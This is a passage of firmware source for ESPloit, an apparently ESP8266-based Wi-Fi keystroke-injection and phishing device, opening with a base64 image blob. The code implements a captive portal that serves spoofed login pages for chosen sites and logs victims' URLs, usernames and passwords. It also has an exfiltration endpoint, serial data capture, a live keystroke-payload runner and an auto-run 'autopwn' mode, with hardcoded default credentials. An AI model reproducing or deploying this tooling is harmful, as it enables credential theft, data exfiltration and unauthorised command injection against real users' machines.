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'><br><i>by Corey Harding<br>www.LegacySecurityGroup.com / www.Exploit.Agency</i><br>-----<br>File System Info Calculated in Bytes<br><b>Total:</b> ")+total+" <b>Free:</b> "+freespace+" "+" <b>Used:</b> "+used+F("<br>-----<br><a href=\"/livepayload\">Live Payload Mode</a> - <a href=\"/inputmode\">Input Mode</a> - <a href=\"/duckuino\">Duckuino Mode</a><br>-<br><a href=\"/listpayloads\">Choose Payload</a> - <a href=\"/uploadpayload\">Upload Payload</a><br>-<br><a href=\"/exfiltrate/list\">List Exfiltrated Data</a> - <a href=\"/format\">Format File System</a><br>-<br><a href=\"/settings\">Configure ESPloit</a><br>-<br><a href=\"/firmware\">Upgrade ESPloit Firmware</a><br>-<br><a href=\"/help\">Help</a></body></html>"));
  });
  if (esportalenabled==1){
  
    server.onNotFound([]() {
      String responseHTML = String()+
      F(
      ""
      "<!DOCTYPE html>"
      "<html>"
      "<body>"
      "<script>"
      "if (document.domain==\"")+local_IPstr+F("\"||document.domain==\"go.microsoft.com\"||document.domain==\"detectportal.firefox.com\")"
      "{"
      "window.open(\"http://")+welcome_domain+welcome_redirect+F("\",\"_self\");"
      "}"
      "else if (document.domain==\"")+site1_domain+F("\"||document.domain==\"www.")+site1_domain+F("\"||document.domain==\"mobile.")+site1_domain+F("\")"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site1_redirect+F("\",\"_self\");"
      "}"
      "else if (document.domain==\"")+site2_domain+F("\"||document.domain==\"www.")+site2_domain+F("\"||document.domain==\"mobile.")+site2_domain+F("\")"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site2_redirect+F("\",\"_self\");"
      "}"
      "else if (document.domain==\"")+site3_domain+F("\"||document.domain==\"www.")+site3_domain+F("\"||document.domain==\"mobile.")+site3_domain+F("\")"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site3_redirect+F("\",\"_self\");"
      "}"
      "else"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site_other_redirect+F("\",\"_self\");"
      "}"
      "</script>"
      "<body>"
      "</html>");
      if (!RawFile(server.uri())){
        File f = SPIFFS.open("/captiveportal.html", "r");
          if (f) {
           server.streamFile(f, "text/html");
         }
          else {
           server.send(200, "text/html", responseHTML);
         }
        f.close();
      }
    });
  
    //Portal welcome page
    server.on(welcome_redirect,[]() {
        File f = SPIFFS.open("/welcome.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", PORTAL_LOGIN_HTML);
          }
        f.close();
    });
    
    //generic catch all login page for domains not listed in configuration
    server.on(site_other_redirect,[]() {
        File f = SPIFFS.open("/spoof_other.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE_OTHER_HTML);
          }
        f.close();
    });
  
    //SITE1 login page
    server.on(site1_redirect,[]() {
        File f = SPIFFS.open("/spoof_site1.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE1_HTML);
          }
        f.close();
    });
  
    //SITE2 login page
    server.on(site2_redirect,[]() {
        File f = SPIFFS.open("/spoof_site2.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE2_HTML);
          }
        f.close();
    });
  
    //SITE3 login page
    server.on(site3_redirect,[]() {
        File f = SPIFFS.open("/spoof_site3.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE3_HTML);
          }
        f.close();
    });
    
    server.on("/validate", []() {
      String url = server.arg("url");
      String user = server.arg("user");
      String pass = server.arg("pass");
      File f = SPIFFS.open("/esportal-log.txt", "a");
      f.print(url);
      f.print(":");
      f.print(user);
      f.print(":");
      f.println(pass);
      f.close();
      File f2 = SPIFFS.open("/error.html", "r");
        if (f2) {
          server.streamFile(f2, "text/html");
        }
        else {
          server.send(200, "text/html", F("HTTP Error 500 Internal server error"));
        }
      f2.close();
    });
  }
  else {
    server.onNotFound([]() {
    if (!RawFile(server.uri()))
      server.send(404, "text/plain", F("Error 404 File Not Found"));
    });
  }
  
  server.on("/settings", handleSettings);

  server.on("/firmware", [](){
    latestversion = "";
    http.begin("http://legacysecuritygroup.com/esploit.php");
    int httpCode = http.GET();
    if (httpCode > 0) {
      latestversion = http.getString();
    }
    http.end();
    String ardupdate;
    
    if (ardversion=="") {
      ardupdate="Could not fetch 32u4 version.<br>Return to the main menu then click on \"Upgrade ESPloit Firmware\"";
    }
    else if (ardversion.startsWith(latestardversion)) {
      ardupdate="32u4 Firmware is up to date.";
    }
    else if (ardversion!=latestardversion) {
      ardupdate="32u4 Firmware needs to be manually updated!";
    }
    else {
      ardupdate="Something went wrong...";
    }
    
    if (version == latestversion && latestversion != "") {
      server.send(200, "text/html", String()+F("<html><body><a href=\"/esploit\"><- BACK TO INDEX</a><br><br><table><tr><th colspan=\"2\">ESPloit Firmware Info</th></tr><tr><td>32u4 Version Installed:</td><td>")+ardversion+F("</td></tr><tr><td>Latest 32u4 Version:</td><td>")+latestardversion+F("</td></tr><tr><td colspan=\"2\" style=\"border-bottom: 1px solid #000;\">")+ardupdate+F("</td></tr><tr><td>ESP Version Installed:</td><td>")+version+F("</td></tr><tr><td>Latest ESP Version:</td><td>")+latestversion+F("</td></tr></table>ESP Firmware is up to date<br><br><iframe name=\"iframe\" style =\"border: 0;\" src=\"http://")+local_IPstr+":1337/update\"><a href=\"http://"+local_IPstr+F(":1337/update\">Click here to Upload Firmware</a></iframe><br><br>Manually install firmware:<br>Download the latest version from: <a href=\"https://github.com/exploitagency/ESPloitV2\" target=\"_blank\">https://github.com/exploitagency/ESPloitV2</a><br>\"ESP_Code.ino.generic.bin\" can be found on the GitHub releases page.<br>Click \"Browse...\" and \"Update\" above to update the ESP portion.<br>Manually update the 32u4 portion using the Arduino IDE.<br>More info can be found on the <a href=\"/help\" target=\"_blank\">help page</a>.</body></html>"));
    }
    else if (version != latestversion && latestversion != "") {
      server.send(200, "text/html", String()+F("<html><body><a href=\"/esploit\"><- BACK TO INDEX</a><br><br><table><tr><th colspan=\"2\">ESPloit Firmware Info</th></tr><tr><td>32u4 Version Installed:</td><td>")+ardversion+F("</td></tr><tr><td>Latest 32u4 Version:</td><td>")+latestardversion+F("</td></tr><tr><td colspan=\"2\" style=\"border-bottom: 1px solid #000;\">")+ardupdate+F("</td></tr><tr><td>ESP Version Installed:</td><td>")+version+F("</td></tr><tr><td>Latest ESP Version:</td><td>")+latestversion+F("</td></tr></table><a href=\"/autoupdatefirmware\" target=\"iframe\">Click to automatically update firmware</a><br><br><iframe name=\"iframe\" style =\"border: 0;\" src=\"http://")+local_IPstr+":1337/update\"><a href=\"http://"+local_IPstr+F(":1337/update\">Click here to Upload Firmware</a></iframe><br><br>Manually install firmware:<br>Download the latest version from: <a href=\"https://github.com/exploitagency/ESPloitV2\" target=\"_blank\">https://github.com/exploitagency/ESPloitV2</a><br>\"ESP_Code.ino.generic.bin\" can be found on the GitHub releases page.<br>Click \"Browse...\" and \"Update\" above to update the ESP portion.<br>Manually update the 32u4 portion using the Arduino IDE.<br>More info can be found on the <a href=\"/help\" target=\"_blank\">help page</a>.</body></html>"));
    }
    else if (httpCode < 0) {
      server.send(200, "text/html", String()+F("<html><body><a href=\"/esploit\"><- BACK TO INDEX</a><br><br><table><tr><th colspan=\"2\">ESPloit Firmware Info</th></tr><tr><td>32u4 Version Installed:</td><td>")+ardversion+F("</td></tr><tr><td>Latest 32u4 Version:</td><td>")+latestardversion+F("</td></tr><tr><td colspan=\"2\" style=\"border-bottom: 1px solid #000;\">")+ardupdate+F("</td></tr><tr><td>ESP Version Installed:</td><td>")+version+F("</td></tr><tr><td>Latest ESP Version:</td><td>?</td></tr></table>Could not connect to the update server<br><br><iframe name=\"iframe\" style =\"border: 0;\" src=\"http://")+local_IPstr+":1337/update\"><a href=\"http://"+local_IPstr+F(":1337/update\">Click here to Upload Firmware</a></iframe><br><br>Manually install firmware:<br>Download the latest version from: <a href=\"https://github.com/exploitagency/ESPloitV2\" target=\"_blank\">https://github.com/exploitagency/ESPloitV2</a><br>\"ESP_Code.ino.generic.bin\" can be found on the GitHub releases page.<br>Click \"Browse...\" and \"Update\" above to update the ESP portion.<br>Manually update the 32u4 portion using the Arduino IDE.<br>More info can be found on the <a href=\"/help\" target=\"_blank\">help page</a>.</body></html>"));
    }
  });

  server.on("/autoupdatefirmware", [](){
    if(!server.authenticate(update_username, update_password))
    return server.requestAuthentication();
    server.send(200, "text/html", String()+F("<html><body>Upgrading firmware...</body></html>"));
    ESPhttpUpdate.update("http://legacysecuritygroup.com/esploit.php?tag=" + version);
  });
  
  server.on("/livepayload", [](){
    server.send(200, "text/html", String()+F("<html><body style=\"height: 100%;\"><a href=\"/esploit\"><- BACK TO INDEX</a><br><br><a href=\"/listpayloads\">List Payloads</a><br><br><a href=\"/uploadpayload\">Upload Payload</a><br><br><FORM action=\"/runlivepayload\" method=\"post\" id=\"live\" target=\"iframe\">Payload: <br><textarea style =\"width: 100%;\" form=\"live\" rows=\"4\" cols=\"50\" name=\"livepayload\"></textarea><br><br><INPUT type=\"radio\" name=\"livepayloadpresent\" value=\"1\" hidden=\"1\" checked=\"checked\"><INPUT type=\"submit\" value=\"Run Payload\"></form><br><hr><br><iframe style =\"visibility: hidden;\" src=\"http://")+local_IPstr+"/runlivepayload\" name=\"iframe\"></iframe></body></html>");
  });


  server.on("/runlivepayload", [](){
    String livepayload;
    livepayload += server.arg("livepayload");
    if (server.hasArg("livepayloadpresent")) {
      server.send(200, "text/html", "<pre>Running live payload: <br>"+livepayload+"</pre>");
      char* splitlines;
      int payloadlen = livepayload.length()+1;
      char request[payloadlen];
      livepayload.toCharArray(request,payloadlen);
      splitlines = strtok(request,"\r\n");
      int defaultdelay = DelayLength;
      int settingsdefaultdelay = DelayLength;
      int custom_delay;
      delay(livepayloaddelay);
      while(splitlines != NULL)
      {
         String liveline=splitlines;
         liveline.replace("&lt;", "<");
         char *i;
         String cmd;
         String cmdinput;
         cmd = String(strtok_r(splitlines,":",&i));

//         Serial.println(String()+"cmd:"+cmd);
//         Serial.println(String()+"cmdin:"+cmdinput);
         
         splitlines = strtok(NULL,"\r\n");
         
         if(cmd == "Rem") {
           cmdinput = String(strtok_r(NULL,":",&i));
           DelayLength = 0;
         }
         
         else if(cmd == "DefaultDelay") {
           cmdinput = String(strtok_r(NULL,":",&i));
           DelayLength = 1500;
           String newdefaultdelay = cmdinput;
           defaultdelay = newdefaultdelay.toInt();
 //          Serial.println(String()+"default delay set to:"+defaultdelay);
         }
         else if(cmd == "BlinkLED") {
           cmdinput = String(strtok_r(NULL,":",&i));
           int blinkcount = cmdinput.toInt();
           for (int i=1; i <= blinkcount; i++){
             digitalWrite(LED_BUILTIN, LOW);
             delay(750);
             digitalWrite(LED_BUILTIN, HIGH);
             delay(500);
           }
         }
         else if(cmd == "CustomDelay") {
           cmdinput = String(strtok_r(NULL,":",&i));
           String customdelay = cmdinput;
           custom_delay = customdelay.toInt();
           DelayLength = custom_delay;
 //          Serial.println(String()+"Custom delay set to:"+custom_delay);
         }
 //        Serial.println(DelayLength);
         else {
           Serial.println(liveline);
         }

         delay(DelayLength); //delay between lines in payload, I found running it slower works best
         DelayLength = defaultdelay;  
      }
      DelayLength = settingsdefaultdelay;
      return 0;
    }
    else {
      server.send(200, "text/html", F("Type or Paste a payload and click \"Run Payload\"."));
    }
  });

  server.on("/restoredefaults", [](){
    server.send(200, "text/html", F("<html><body>This will restore the device to the default configuration.<br><br>Are you sure?<br><br><a href=\"/restoredefaults/yes\">YES</a> - <a href=\"/esploit\">NO</a></body></html>"));
  });

  server.on("/restoredefaults/yes", [](){
    if(!server.authenticate(update_username, update_password))
      return server.requestAuthentication();
    server.send(200, "text/html", F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br>Network<br>---<br>SSID: <b>Exploit</b> PASS: <b>DotAgency</b><br><br>Administration<br>---<br>USER: <b>admin</b> PASS: <b>hacktheplanet</b>"));
    loadDefaults();
    ESP.restart();
  });

  server.on("/deletepayload", [](){
    String deletepayload;
    deletepayload += server.arg(0);
    server.send(200, "text/html", "<html><body>This will delete the file: "+deletepayload+".<br><br>Are you sure?<br><br><a href=\"/deletepayload/yes?payload="+deletepayload+"\">YES</a> - <a href=\"/esploit\">NO</a></body></html>");
  });

  server.on("/deletepayload/yes", [](){
    if(!server.authenticate(update_username, update_password))
      return server.requestAuthentication();
    String deletepayload;
    deletepayload += server.arg(0);
    if (deletepayload.startsWith("/payloads/")) server.send(200, "text/html", String()+F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br><a href=\"/listpayloads\">List Payloads</a><br><br>Deleting file: ")+deletepayload);
    if (!deletepayload.startsWith("/payloads/")) server.send(200, "text/html", String()+F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br><a href=\"/exfiltrate/list\">List Exfiltrated Data</a><br><br>Deleting file: ")+deletepayload);
    SPIFFS.remove(deletepayload);
  });

  server.on("/format", [](){
    server.send(200, "text/html", F("<html><body><a href=\"/esploit\"><- BACK TO INDEX</a><br><br>This will reformat the SPIFFS File System.<br><br>Are you sure?<br><br><a href=\"/format/yes\">YES</a> - <a href=\"/esploit\">NO</a></body></html>"));
  });

  server.on("/exfiltrate", [](){
    String file = server.arg("file");
    String data = server.arg("data");
    // open the file in write mode
    String truncatedname = file.substring(0,30);
    File f = SPIFFS.open(String("/"+truncatedname), "w");
    f.println(data);
    f.close();
  });

  server.on("/exfiltrate/list", ListPayloads);

  server.on("/reboot", [](){
    if(!server.authenticate(update_username, update_password))
    return server.requestAuthentication();
    server.send(200, "text/html", F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br>Rebooting ESPloit..."));
    ESP.restart();
  });
  
  server.on("/format/yes", [](){
    if(!server.authenticate(update_username, update_password))
      return server.requestAuthentication();
    server.send(200, "text/html", F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br>Formatting file system: This may take up to 90 seconds"));
//    Serial.print("Formatting file system...");
    SPIFFS.format();
//    Serial.println(" Success");
    saveConfig();
  });
    
  server.on("/uploadpayload", []() {
    server.send(200, "text/html", F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br><a href=\"/listpayloads\">List Payloads</a><br><br><a href=\"/livepayload\">Live Payload Mode</a><br><br><b>Upload Payload:</b><br><br><form method='POST' action='/upload' enctype='multipart/form-data'><input type='file' name='upload' multiple><input type='submit' value='Upload'></form>"));
  });
    
  server.on("/listpayloads", ListPayloads);
    
  server.onFileUpload(handleFileUpload);
    
  server.on("/upload", HTTP_POST, []() {
    server.send(200, "text/html", F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br>Upload Successful!<br><br><a href=\"/listpayloads\">List Payloads</a><br><br><a href=\"/uploadpayload\">Upload Another Payload</a>"));
  });

  server.on("/help", []() {
    server.send_P(200, "text/html", HelpText);
  });
  
  server.on("/license", []() {
    server.send_P(200, "text/html", License);
  });

  server.on("/inputmode", []() {
    server.send_P(200, "text/html", InputModePage);
  });

  server.on("/duckuino", []() {
    server.send_P(200, "text/html", Duckuino);
  });
    
  server.on("/showpayload", ShowPayloads);

  server.on("/dopayload", [](){
    String dopayload;
    dopayload += server.arg(0);
    server.send(200, "text/html", String()+F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br><pre>Running payload: ")+dopayload+F("</pre><br>This may take a while to complete..."));
//    Serial.println("Running payaload: "+dopayload);
    File f = SPIFFS.open(dopayload, "r");
    int defaultdelay = DelayLength;
    int settingsdefaultdelay = DelayLength;
    int custom_delay;
    while(f.available()) {
//      SOFTserial.println(line);
//      Serial.println(line);
      String line = f.readStringUntil('\n');
      line.replace("&lt;", "<");

      String fullkeys = line;
      int str_len = fullkeys.length()+1; 
      char keyarray[str_len];
      fullkeys.toCharArray(keyarray, str_len);

      char *i;
      String cmd;
      String cmdinput;
      cmd = String(strtok_r(keyarray,":",&i));

//         Serial.println(String()+"cmd:"+cmd);
//         Serial.println(String()+"cmdin:"+cmdinput);
     
      if(cmd == "Rem") {
        cmdinput = String(strtok_r(NULL,":",&i));
        DelayLength = 0;
      }
      
      else if(cmd == "DefaultDelay") {
        cmdinput = String(strtok_r(NULL,":",&i));
        DelayLength = 1500;
        String newdefaultdelay = cmdinput;
        defaultdelay = newdefaultdelay.toInt();
//          Serial.println(String()+"default delay set to:"+defaultdelay);
      }
      else if(cmd == "BlinkLED") {
        cmdinput = String(strtok_r(NULL,":",&i));
        int blinkcount = cmdinput.toInt();
        for (int i=1; i <= blinkcount; i++){
          digitalWrite(LED_BUILTIN, LOW);
          delay(750);
          digitalWrite(LED_BUILTIN, HIGH);
          delay(500);
        }
      }
      else if(cmd == "CustomDelay") {
        cmdinput = String(strtok_r(NULL,":",&i));
        String customdelay = cmdinput;
        custom_delay = customdelay.toInt();
        DelayLength = custom_delay;
//          Serial.println(String()+"Custom delay set to:"+custom_delay);
      }
      else {
        Serial.println(line);
      }
//        Serial.println(DelayLength);
      delay(DelayLength); //delay between lines in payload, I found running it slower works best
      DelayLength = defaultdelay;
    }
    f.close();
    DelayLength = settingsdefaultdelay;
  });
  
  server.begin();
  WiFiClient client;
  client.setNoDelay(1);

//  Serial.println("Web Server Started");

  MDNS.begin("ESPloit");

  httpUpdater.setup(&httpServer, update_path, update_username, update_password);
  httpServer.begin();

  MDNS.addService("http", "tcp", 1337);
  if (esportalenabled==1){
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  }
  
  if (ftpenabled==1){
    ftpSrv.begin(String(ftp_username),String(ftp_password));
  }
  
  if (autopwn==1){
    runpayload();
  }
  
}

void loop() {
  if (ftpenabled==1){
    ftpSrv.handleFTP();
  }
  server.handleClient();
  httpServer.handleClient();
  if (esportalenabled==1){
    dnsServer.processNextRequest();
  }
//  drd.loop();
  while (Serial.available()) {
    String cmd = Serial.readStringUntil(':');
        if(cmd == "ResetDefaultConfig"){
          String RSDC = Serial.readStringUntil('\n');
          if(RSDC.indexOf("OpenNetwork") >=0) {
            open_network=1;
          }
          else {
            open_network=0;
          }
          loadDefaults();
          ESP.restart();
        }
        //check 32u4 version info
        else if(cmd == "Version"){
          ardversion = Serial.readStringUntil('\n');
        }
        else if(cmd == "SerialEXFIL"){
          String SerialEXFIL = Serial.readStringUntil('\n');
          File f = SPIFFS.open("/SerialEXFIL.txt", "a");
          f.println(SerialEXFIL);
          f.close();
        }
        else if(cmd == "BlinkLED") {
          String cmdinput = Serial.readStringUntil('\n');
          int blinkcount = cmdinput.toInt();
          for (int i=1; i <= blinkcount; i++){
            digitalWrite(LED_BUILTIN, LOW);
            delay(750);
            digitalWrite(LED_BUILTIN, HIGH);
            delay(500);
          }
        }
  }
  
  //Serial.print("Free heap-");
  //Serial.println(ESP.getFreeHeap(),DEC);
}
